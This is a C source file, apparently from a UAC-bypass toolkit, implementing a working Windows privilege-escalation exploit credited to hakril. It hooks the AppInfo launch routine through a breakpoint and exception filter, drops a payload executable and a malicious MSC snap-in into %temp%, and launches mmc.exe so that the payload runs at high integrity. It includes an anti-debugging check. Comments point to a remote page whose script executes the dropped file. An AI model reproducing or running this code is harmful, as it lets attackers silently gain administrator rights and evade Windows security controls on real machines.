/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2019
*
*  TITLE:       HAKRIL.C
*
*  VERSION:     3.17
*
*  DATE:        17 Mar 2019
*
*  UAC bypass method from Clement Rouault aka hakril.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

LPWSTR g_SnapInParameters = NULL;
pfnAipFindLaunchAdminProcess g_OriginalFunction = NULL;
BYTE g_OriginalPrologue = 0;

/*
* AicLaunchAdminProcessHook
*
* Purpose:
*
* Hook handler for tampering APPINFO params.
*
*/
ULONG_PTR WINAPI AicLaunchAdminProcessHook(
    LPWSTR lpApplicationName,
    LPWSTR lpParameters,
    DWORD UacRequestFlag,
    DWORD dwCreationFlags,
    LPWSTR lpCurrentDirectory,
    HWND hWnd,
    PVOID StartupInfo,
    PVOID ProcessInfo,
    ELEVATION_REASON *ElevationReason
)
{
    UNREFERENCED_PARAMETER(lpParameters);

    if (!AicSetRemoveFunctionBreakpoint(
        g_OriginalFunction,
        &g_OriginalPrologue,
        sizeof(g_OriginalPrologue),
        FALSE,
        NULL))
    {
        return 0; //general fuckup.
    }

    return g_OriginalFunction(lpApplicationName,
        g_SnapInParameters,
        UacRequestFlag,
        dwCreationFlags,
        lpCurrentDirectory,
        hWnd,
        StartupInfo,
        ProcessInfo,
        ElevationReason);
}

/*
* AicUnhandledExceptionFilter
*
* Purpose:
*
* Exception handler for breakpoint.
*
*/
LONG WINAPI AicUnhandledExceptionFilter(
    _In_ EXCEPTION_POINTERS *ExceptionInfo
)
{
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {
#ifdef _WIN64
        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)g_OriginalFunction)
            ExceptionInfo->ContextRecord->Rip = (DWORD64)AicLaunchAdminProcessHook;
#else
        if (ExceptionInfo->ContextRecord->Eip == (DWORD)g_OriginalFunction)
            ExceptionInfo->ContextRecord->Eip = (DWORD)AicLaunchAdminProcessHook;
#endif
    }
    return EXCEPTION_CONTINUE_EXECUTION;
}

/*
* ucmHakrilMethod
*
* Purpose:
*
* Bypass UAC by abusing "feature" of appinfo command line parser.
* (all bugs are features/not a boundary of %something% by MS philosophy)
* Command line parser logic allows execution of custom snap-in console as if it
* "trusted" by Microsoft, resulting in your code running inside MMC.exe on High IL.
*
* Trigger: custom console snap-in with shockwave flash object resulting in
* execution of remote script on local machine with High IL.
*
*/
NTSTATUS ucmHakrilMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED, StatusCode;

    BOOL bExtracted = FALSE;
    ULONG DataSize = 0, SnapinSize = 0;
    SIZE_T Dummy;
    PVOID SnapinResource = NULL, SnapinData = NULL;
    PVOID ImageBaseAddress = g_hInstance;
    PVOID LaunchAdminProcessPtr = NULL;
    LPWSTR lpText;

    LPTOP_LEVEL_EXCEPTION_FILTER PreviousFilter;

    WCHAR szBuffer[MAX_PATH * 2];
    SHELLEXECUTEINFO shinfo;

    do {

#ifndef _DEBUG
        if (supIsDebugPortPresent()) {
            MethodResult = STATUS_DEBUG_ATTACH_FAILED;
            break;
        }
#endif     

        //
        // Lookup AicLaunchAdminProcess routine pointer.
        //
        LaunchAdminProcessPtr = (PVOID)AicFindLaunchAdminProcess(&StatusCode);
        if (LaunchAdminProcessPtr == NULL) {

            switch (StatusCode) {

            case STATUS_PROCEDURE_NOT_FOUND:
                lpText = TEXT("The required procedure address not found.");
                break;

            default:
                lpText = TEXT("Unspecified error in AipFindLaunchAdminProcess.");
                break;
            }

            ucmShowMessage(g_ctx->OutputToDebugger, lpText);
            MethodResult = StatusCode;
            break;
        }

        //
        // Decrypt and decompress custom Kamikaze snap-in.
        //
        SnapinResource = supLdrQueryResourceData(
            KAMIKAZE_ID,
            ImageBaseAddress,
            &DataSize);

        if (SnapinResource) {
            SnapinData = g_ctx->DecompressRoutine(KAMIKAZE_ID, SnapinResource, DataSize, &SnapinSize);
            if (SnapinData == NULL)
                break;
        }
        else
            break;

        if (!supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            FUBUKI_DEFAULT_ENTRYPOINT,
            TRUE))
        {
            break;
        }

        //
        // Write Fubuki.exe to the %temp%
        //
        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        Dummy = _strlen(szBuffer);
        _strcat(szBuffer, FUBUKI_EXE);

        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
            break;

        //
        // Write payload msc snap-in to the %temp%
        //
        // All payload of this msc file is a link to external site
        //
        // <String ID="3" Refs="1">https://hfiref0x.github.io/Beacon/uac/exec</String>
        //
        // Where contents of this page are the following:
        //
        // <html><body><script>external.ExecuteShellCommand("%temp%\\fubuki.exe", "%systemdrive%", "", "Restored");</script></body></html>
        // raw.githubusercontent.com/hfiref0x/Beacon/master/uac/exec.html
        // 
        szBuffer[Dummy] = 0;
        _strcat(szBuffer, KAMIKAZE_MSC);
        if (!supWriteBufferToFile(szBuffer, SnapinData, SnapinSize))
            break;

        bExtracted = TRUE;

        //
        // Allocate and fill snap-in parameters buffer.
        //
        g_SnapInParameters = (LPWSTR)supHeapAlloc(PAGE_SIZE);
        if (g_SnapInParameters == NULL)
            break;

        _strcpy(g_SnapInParameters, TEXT("huy32,wf.msc \""));
        _strcat(g_SnapInParameters, szBuffer);
        _strcat(g_SnapInParameters, TEXT("\""));

        //
        // Setup function breakpoint.
        //
        g_OriginalFunction = (pfnAipFindLaunchAdminProcess)LaunchAdminProcessPtr;
        g_OriginalPrologue = 0;
        if (!AicSetRemoveFunctionBreakpoint(
            g_OriginalFunction,
            &g_OriginalPrologue,
            sizeof(g_OriginalPrologue),
            TRUE,
            NULL))
        {
            MethodResult = STATUS_BREAKPOINT;
            break;
        }

        PreviousFilter = SetUnhandledExceptionFilter(
            (LPTOP_LEVEL_EXCEPTION_FILTER)AicUnhandledExceptionFilter);

        //
        // Run trigger application.
        //
        RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
        shinfo.cbSize = sizeof(shinfo);
        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        shinfo.lpFile = MMC_EXE;
        shinfo.lpParameters = g_SnapInParameters;
        shinfo.lpVerb = RUNAS_VERB;
        shinfo.nShow = SW_SHOW;
        if (ShellExecuteEx(&shinfo)) {
            if (WaitForSingleObject(shinfo.hProcess, 0x4e20) == WAIT_TIMEOUT)
                TerminateProcess(shinfo.hProcess, (UINT)-1);
            CloseHandle(shinfo.hProcess);
            MethodResult = STATUS_SUCCESS;
        }

        SetUnhandledExceptionFilter(PreviousFilter);

    } while (FALSE);

    //
    // Cleanup.
    //
    if (SnapinData) {
        RtlSecureZeroMemory(SnapinData, SnapinSize);
        supVirtualFree(SnapinData, NULL);
    }

    if (g_SnapInParameters) {
        supHeapFree(g_SnapInParameters);
        g_SnapInParameters = NULL;
    }

    //
    // Remove our msc file. Fubuki should be removed by payload code itself as it will be locked on execution.
    //
    if (bExtracted) {
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, KAMIKAZE_MSC);
        DeleteFile(szBuffer);
    }

    return MethodResult;
}

/*
* ucmHakrilMethodCleanup
*
* Purpose:
*
* Post execution cleanup routine for HakrilMethod
*
*/
BOOL ucmHakrilMethodCleanup(
    VOID
)
{
    WCHAR szBuffer[MAX_PATH * 2];

    _strcpy(szBuffer, g_ctx->szTempDirectory);
    _strcat(szBuffer, FUBUKI_EXE);

    return DeleteFile(szBuffer);
}
